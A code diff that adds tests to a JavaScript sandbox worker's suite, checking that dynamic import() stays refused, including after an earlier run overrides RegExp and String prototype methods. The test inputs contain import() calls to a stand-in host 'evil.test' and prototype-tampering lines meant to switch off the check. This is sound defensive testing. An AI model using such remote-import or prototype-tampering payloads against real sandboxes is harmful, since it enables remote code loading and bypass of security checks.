@@ -182,8 +182,30 @@ describe("LiveJS worker: no import() and no way to compile one", () => {
       'console.log("import")',
       "// import\nconsole.log(1)",
       'console.log({ import: 1 })',
+      'import("https://evil.test/m.js")',
+      'await 0; import("https://evil.test/m.js")',
     ]) {
       await refusedImport(source);
+    }
+  });
+
+  it("an earlier shared run cannot switch the check off", async () => {
+    const w = new VmWorker();
+    const tamper = [
+      "RegExp.prototype.test = () => false;",
+      "RegExp.prototype.exec = () => null;",
+      "String.prototype.indexOf = () => -1;",
+      "String.prototype.includes = () => false;",
+      'String.prototype[-1] = "a";',
+      "for (let i = 0; i < 200; i++) String.prototype[i] = \"a\";",
+      'globalThis.String = () => "";',
+      'console.log("tampered");',
+    ].join("\n");
+    expect((await runRaw(w, tamper, 1)).logs).toEqual([["log", "tampered"]]);
+    for (const [k, source] of ['import("https://evil.test/a.js")', 'await 0; import("https://evil.test/b.js")'].entries()) {
+      const { logs } = await runRaw(w, source, 2 + k);
+      expect(logs, source).toHaveLength(1);
+      expect(logs[0][1]).toContain('contains the word "import"');
     }
   });
 
